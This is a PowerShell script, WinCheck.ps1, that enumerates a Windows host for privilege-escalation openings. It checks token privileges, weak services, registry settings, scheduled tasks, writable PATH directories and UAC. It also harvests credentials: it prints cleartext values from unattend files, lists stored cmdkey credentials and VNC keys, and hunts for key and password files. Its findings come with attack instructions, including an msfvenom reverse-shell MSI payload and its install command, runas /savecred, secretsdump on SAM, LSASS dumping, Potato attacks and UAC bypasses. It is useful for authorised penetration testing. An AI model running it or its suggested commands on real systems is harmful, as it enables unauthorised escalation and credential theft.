#Requires -Version 5.1
<#
.SYNOPSIS
    WinCheck.ps1 — Windows privilege escalation checker (PowerShell rewrite of wincheck.py)

.DESCRIPTION
    Pure PowerShell — no Python, no pip, no external tools.
    Uses native cmdlets and WMI throughout. Runs anywhere PowerShell 5.1+ exists.

.PARAMETER Section
    Run a single section: sysinfo tokens services registry tasks paths files users network uac

.PARAMETER Out
    Save report to file.

.PARAMETER Fast
    Skip slow filesystem searches.

.EXAMPLE
    .\WinCheck.ps1
    .\WinCheck.ps1 -Section tokens
    .\WinCheck.ps1 -Out C:\Temp\report.txt
    .\WinCheck.ps1 -Fast
    powershell -ExecutionPolicy Bypass -File .\WinCheck.ps1
#>
[CmdletBinding()]
param(
    [ValidateSet("sysinfo","tokens","services","registry","tasks","paths","files","users","network","uac","")]
    [string]$Section = "",
    [string]$Out = "",
    [switch]$Fast
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

# ── Colours ────────────────────────────────────────────────────────────────────
$Report = [System.Collections.Generic.List[string]]::new()

# Bug fix: previously Out-Line was defined but never called by any output function,
# so $Report stayed empty and -Out always wrote a blank file.
# Each function now writes to both the console (with colour) and $Report (plain text).
function Write-Banner { param($t)
    $bar = "═" * 64
    Write-Host "`n$bar" -ForegroundColor Cyan
    Write-Host "  $t"   -ForegroundColor Cyan
    Write-Host $bar     -ForegroundColor Cyan
    $script:Report.Add("`n$bar"); $script:Report.Add("  $t"); $script:Report.Add($bar)
}
function Write-Hit  { param($m) Write-Host "  [!] $m" -ForegroundColor Red;    $script:Report.Add("  [!] $m") }
function Write-Warn { param($m) Write-Host "  [*] $m" -ForegroundColor Yellow; $script:Report.Add("  [*] $m") }
function Write-Good { param($m) Write-Host "  [+] $m" -ForegroundColor Green;  $script:Report.Add("  [+] $m") }
function Write-Info { param($m) Write-Host "  [-] $m" -ForegroundColor Gray;   $script:Report.Add("  [-] $m") }
function Write-Sub  { param($m) Write-Host "      $m";                          $script:Report.Add("      $m") }

# ── Helpers ────────────────────────────────────────────────────────────────────
function Run { param($cmd)
    try { cmd /c $cmd 2>&1 } catch { "" }
}

function Get-Acl-Write { param($path)
    try {
        $acl = (Get-Acl $path).Access
        foreach ($ace in $acl) {
            $rights = $ace.FileSystemRights.ToString()
            $id     = $ace.IdentityReference.ToString()
            if ($rights -match "FullControl|Modify|Write" -and
                $id -match "Everyone|Users|Authenticated") {
                return $true
            }
        }
    } catch {}
    return $false
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-SysInfo {
    Write-Banner "SYSTEM INFO"
    Write-Info "Hostname   : $env:COMPUTERNAME"
    Write-Info "User       : $(whoami)"
    Write-Info "OS         : $((Get-CimInstance Win32_OperatingSystem).Caption)"
    Write-Info "Build      : $((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuildNumber)"
    Write-Info "Arch       : $env:PROCESSOR_ARCHITECTURE"
    Write-Info "Domain     : $env:USERDOMAIN"

    $spooler = Get-Service Spooler -EA SilentlyContinue
    if ($spooler -and $spooler.Status -eq "Running") {
        Write-Hit "Print Spooler RUNNING — check PrintNightmare (CVE-2021-1675 / CVE-2021-34527)"
    }

    $build = [int](Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuildNumber
    if ($build -lt 19041) { Write-Hit "Build $build — check CVE-2020-0796 (SMBGhost)" }
    if ($build -lt 17763) { Write-Hit "Build $build — check MS17-010 (EternalBlue), CVE-2019-0708 (BlueKeep)" }

    Write-Info "`nLast 10 patches:"
    Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 |
        ForEach-Object { Write-Sub "$($_.HotFixID)  $($_.InstalledOn)" }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Tokens {
    Write-Banner "TOKEN PRIVILEGES"
    $privs = whoami /priv
    $privs | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }

    $attacks = @{
        "SeImpersonatePrivilege"        = "Potato attacks — JuicyPotato, PrintSpoofer, RoguePotato"
        "SeAssignPrimaryTokenPrivilege" = "Potato attacks — same as SeImpersonate"
        "SeBackupPrivilege"             = "reg save HKLM\SAM then secretsdump offline"
        "SeRestorePrivilege"            = "Overwrite system binaries"
        "SeDebugPrivilege"              = "Inject into SYSTEM processes / dump LSASS"
        "SeLoadDriverPrivilege"         = "Load unsigned kernel driver — kernel code exec"
        "SeManageVolumePrivilege"       = "Direct disk write — overwrite any sector"
        "SeTakeOwnershipPrivilege"      = "Take ownership of any object, then grant access"
        "SeCreateTokenPrivilege"        = "Create token with arbitrary groups — direct SYSTEM"
        "SeTcbPrivilege"                = "Act as OS — create tokens, logon any user"
        "SeRelabelPrivilege"            = "Raise object integrity level"
        "SeCreateSymbolicLinkPrivilege" = "Symlink attacks on privileged file paths"
    }

    Write-Host ""
    foreach ($priv in $attacks.Keys) {
        if ($privs -match $priv) {
            $state = if ($privs -match "$priv.*Disabled") { "DISABLED" } else { "ENABLED" }
            if ($state -eq "ENABLED") {
                Write-Hit "$priv — $($attacks[$priv])"
            } else {
                Write-Warn "$priv present but DISABLED (may be enableable)"
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Services {
    Write-Banner "SERVICES — UNQUOTED PATHS & WEAK PERMISSIONS"

    Write-Info "Unquoted service paths:"
    # Bug fix: Get-WmiObject removed in PowerShell 7+ — use Get-CimInstance throughout
    Get-CimInstance Win32_Service | Where-Object {
        $_.PathName -and
        $_.PathName -notmatch '^"' -and
        $_.PathName -match ' ' -and
        $_.PathName -notmatch 'C:\\Windows'
    } | ForEach-Object {
        Write-Hit "Unquoted: $($_.Name)"
        Write-Sub "  Path: $($_.PathName)"
        Write-Sub "  Mode: $($_.StartMode)"
        # Suggest hijack candidates
        $parts = $_.PathName -split "\\"
        $cumulative = ""
        foreach ($part in $parts[0..($parts.Length-2)]) {
            $cumulative += $part + "\"
            if ($cumulative -match " ") {
                $candidate = $cumulative.TrimEnd("\") + ".exe"
                Write-Sub "  Try:  $candidate"
            }
        }
    }

    Write-Host ""
    Write-Info "Checking service binary write permissions:"
    Get-CimInstance Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
        $bin = ($_.PathName -replace '"','') -split ' ' | Select-Object -First 1
        if ($bin -and (Test-Path $bin)) {
            if (Get-Acl-Write $bin) {
                Write-Hit "Writable service binary: $bin  [$($_.Name)]"
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-RegistryChecks {
    Write-Banner "REGISTRY"

    # AlwaysInstallElevated
    Write-Info "AlwaysInstallElevated:"
    $hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
                -Name AlwaysInstallElevated -EA SilentlyContinue
    $hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
                -Name AlwaysInstallElevated -EA SilentlyContinue
    if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
        Write-Hit "AlwaysInstallElevated = 1 in BOTH hives"
        Write-Sub "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=x -f msi -o evil.msi"
        Write-Sub "  msiexec /quiet /qn /i evil.msi"
    } else {
        Write-Info "  HKLM: $($hklm.AlwaysInstallElevated)   HKCU: $($hkcu.AlwaysInstallElevated)"
    }

    # AutoRun keys
    Write-Host ""
    Write-Info "AutoRun keys:"
    $runKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
    )
    foreach ($key in $runKeys) {
        $props = Get-ItemProperty $key -EA SilentlyContinue
        if ($props) {
            Write-Info "  $key"
            $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                Write-Sub "    $($_.Name) = $($_.Value)"
                # Bug fix: $_.Value can be null — calling .ToString() on null throws
                if ($null -eq $_.Value) { return }
                $bin = ([regex]::Match($_.Value.ToString(), '"?([A-Za-z]:\\[^"]+\.exe)')).Groups[1].Value
                if ($bin -and (Test-Path $bin) -and (Get-Acl-Write $bin)) {
                    Write-Hit "    Writable AutoRun binary: $bin"
                }
            }
        }
    }

    # Stored credentials
    Write-Host ""
    Write-Info "Stored credentials (cmdkey):"
    $creds = Run "cmdkey /list"
    if ($creds -match "Target:") {
        Write-Good "Stored credentials found:"
        $creds | ForEach-Object { Write-Sub $_ }
        Write-Hit "Use: runas /savecred /user:<user> cmd.exe"
    } else {
        Write-Info "  None found"
    }

    # VNC / WinVNC passwords
    Write-Host ""
    Write-Info "VNC passwords in registry:"
    $vncKeys = @(
        "HKLM:\SOFTWARE\ORL\WinVNC3",
        "HKLM:\SOFTWARE\RealVNC\WinVNC4",
        "HKCU:\SOFTWARE\TightVNC\Server"
    )
    foreach ($k in $vncKeys) {
        $v = Get-ItemProperty $k -EA SilentlyContinue
        if ($v) { Write-Hit "VNC registry key found: $k`n$($v | Out-String)" }
    }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Tasks {
    Write-Banner "SCHEDULED TASKS"
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -match "SYSTEM|Administrator" } |
    ForEach-Object {
        $action = $_.Actions | Select-Object -First 1
        $cmd    = "$($action.Execute) $($action.Arguments)"
        Write-Info "Task: $($_.TaskName)  [runs as $($_.Principal.UserId)]"
        Write-Sub  "  Cmd: $cmd"

        # Check if script is writable
        $match = [regex]::Match($cmd, '"?([A-Za-z]:\\[^\s"]+\.(bat|ps1|cmd|vbs|py|exe))"?')
        if ($match.Success) {
            $script = $match.Groups[1].Value
            if (Test-Path $script) {
                if (Get-Acl-Write $script) {
                    Write-Hit "  Writable task script (runs as SYSTEM): $script"
                }
            } elseif ($script) {
                Write-Hit "  Missing task binary (path hijack): $script"
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Paths {
    Write-Banner "PATH — DLL / EXE HIJACK"
    $pathDirs = $env:PATH -split ";"
    foreach ($d in $pathDirs) {
        if (!$d) { Write-Hit "Empty PATH entry — current directory DLL hijack possible"; continue }
        Write-Info $d
        if (!(Test-Path $d)) {
            Write-Hit "  Missing PATH dir — create to hijack: $d"
        } elseif (Get-Acl-Write $d) {
            Write-Hit "  Writable PATH dir: $d — drop malicious DLL/EXE"
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Files {
    Write-Banner "INTERESTING FILES"

    Write-Info "Unattend / Sysprep files (often contain cleartext passwords):"
    $sysprepPaths = @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\UnattendGC\Unattend.xml",
        "C:\Windows\System32\sysprep\sysprep.xml",
        "C:\Windows\System32\sysprep\Unattend.xml",
        "C:\unattend.xml","C:\sysprep.inf"
    )
    foreach ($p in $sysprepPaths) {
        if (Test-Path $p) {
            Write-Hit "Found: $p"
            $content = Get-Content $p -Raw -EA SilentlyContinue
            if ($content -match '<Value>([^<]+)</Value>') {
                Write-Hit "  Possible cleartext value: $($Matches[1])"
            }
        }
    }

    Write-Host ""
    Write-Info "SAM / SYSTEM backup files:"
    @("C:\Windows\Repair\SAM","C:\Windows\Repair\SYSTEM",
      "C:\Windows\System32\config\SAM","C:\Windows\System32\config\SYSTEM") | ForEach-Object {
        if (Test-Path $_) {
            try {
                [IO.File]::OpenRead($_).Close()
                Write-Hit "READABLE: $_ — copy with reg save, then secretsdump offline"
            } catch {
                Write-Info "Exists but locked: $_"
            }
        }
    }

    if (!$Fast) {
        Write-Host ""
        Write-Info "Searching for password files (slow — use -Fast to skip):"
        $roots = @($env:USERPROFILE, "C:\inetpub", "C:\xampp", $env:ProgramFiles)
        foreach ($r in $roots) {
            if (!(Test-Path $r)) { continue }
            Get-ChildItem $r -Recurse -Include @("*pass*","*.key","*.pem","web.config","*.config") `
                -EA SilentlyContinue -Depth 6 | Select-Object -First 20 | ForEach-Object {
                Write-Warn $_.FullName
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Users {
    Write-Banner "LOCAL USERS & GROUPS"
    Write-Info "Local users:"
    Get-LocalUser | Format-Table Name, Enabled, LastLogon -AutoSize | Out-String | Write-Host
    Write-Info "Administrators:"
    Get-LocalGroupMember Administrators -EA SilentlyContinue | Format-Table Name, ObjectClass -AutoSize | Out-String | Write-Host
    Write-Info "Active sessions:"
    Run "query session" | ForEach-Object { Write-Sub $_ }
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Network {
    Write-Banner "NETWORK"
    Write-Info "Listening ports:"
    Get-NetTCPConnection -State Listen | Sort-Object LocalPort |
        Select-Object LocalAddress, LocalPort, OwningProcess |
        ForEach-Object {
            $proc = Get-Process -Id $_.OwningProcess -EA SilentlyContinue
            Write-Sub "  $($_.LocalAddress):$($_.LocalPort)  [$($proc.ProcessName) PID $($_.OwningProcess)]"
        }
    Write-Host ""
    Write-Info "Network shares:"
    Get-SmbShare | Format-Table Name, Path, Description -AutoSize | Out-String | Write-Host
    Write-Host ""
    Write-Info "Firewall profiles:"
    Get-NetFirewallProfile | Format-Table Name, Enabled, DefaultInboundAction -AutoSize | Out-String | Write-Host
}

# ══════════════════════════════════════════════════════════════════════════════
function Get-Uac {
    Write-Banner "UAC"
    $uacKey  = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    $uacProp = Get-ItemProperty $uacKey -EA SilentlyContinue
    $consent = $uacProp.ConsentPromptBehaviorAdmin
    $lual    = $uacProp.EnableLUA

    Write-Info "EnableLUA                     : $lual"
    Write-Info "ConsentPromptBehaviorAdmin    : $consent"

    $levels = @{
        0 = "Elevate silently — no prompt (most permissive)"
        1 = "Prompt for credentials on secure desktop"
        2 = "Prompt for consent on secure desktop"
        3 = "Prompt for credentials"
        4 = "Prompt for consent for non-Windows binaries"
        5 = "Prompt for consent for non-Windows binaries (default)"
    }
    # Bug fix: $consent/$lual can be null if the properties aren't set.
    # [int]$null == 0 which would match the level-0 and lual==0 checks as false positives.
    # Guard with explicit null checks before any int cast or comparison.
    if ($null -ne $consent) {
        $consentInt = [int]$consent
        if ($levels.ContainsKey($consentInt)) {
            Write-Info "  → $($levels[$consentInt])"
        }
        if ($consentInt -in @(0,4,5)) {
            Write-Hit "UAC level $consentInt — fodhelper, eventvwr, or other auto-elevate bypasses likely work"
        }
    }
    if ($null -ne $lual -and [int]$lual -eq 0) {
        Write-Hit "EnableLUA = 0 — UAC completely disabled!"
    }

    # Check current integrity
    $groups = whoami /groups
    if ($groups -match "S-1-16-8192") { Write-Info "Current integrity: MEDIUM" }
    if ($groups -match "S-1-16-12288") { Write-Good "Current integrity: HIGH (already elevated)" }
    if ($groups -match "S-1-16-16384") { Write-Good "Current integrity: SYSTEM" }
    if ($groups -match "S-1-5-32-544" -and $groups -match "S-1-16-8192") {
        Write-Hit "Local admin at MEDIUM integrity — UAC bypass → SYSTEM"
    }
}

# ══════════════════════════════════════════════════════════════════════════════
$allSections = [ordered]@{
    sysinfo  = { Get-SysInfo }
    tokens   = { Get-Tokens }
    services = { Get-Services }
    registry = { Get-RegistryChecks }
    tasks    = { Get-Tasks }
    paths    = { Get-Paths }
    files    = { Get-Files }
    users    = { Get-Users }
    network  = { Get-Network }
    uac      = { Get-Uac }
}

$startTime = Get-Date
Write-Host "`n$('='*64)" -ForegroundColor Cyan
Write-Host "  WinCheck.ps1 — Windows Privesc Checker" -ForegroundColor Cyan
Write-Host "  $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')  |  $env:COMPUTERNAME\$(whoami)" -ForegroundColor Cyan
Write-Host "$('='*64)`n" -ForegroundColor Cyan

if ($Section) {
    & $allSections[$Section]
} else {
    foreach ($fn in $allSections.Values) { try { & $fn } catch {} }
}

$elapsed = ((Get-Date) - $startTime).TotalSeconds
Write-Host "`n[*] Done in $($elapsed.ToString('F1'))s" -ForegroundColor Cyan

if ($Out) {
    # Re-run capturing output to file
    $Report | Set-Content $Out
    Write-Host "[+] Report saved to $Out" -ForegroundColor Green
}
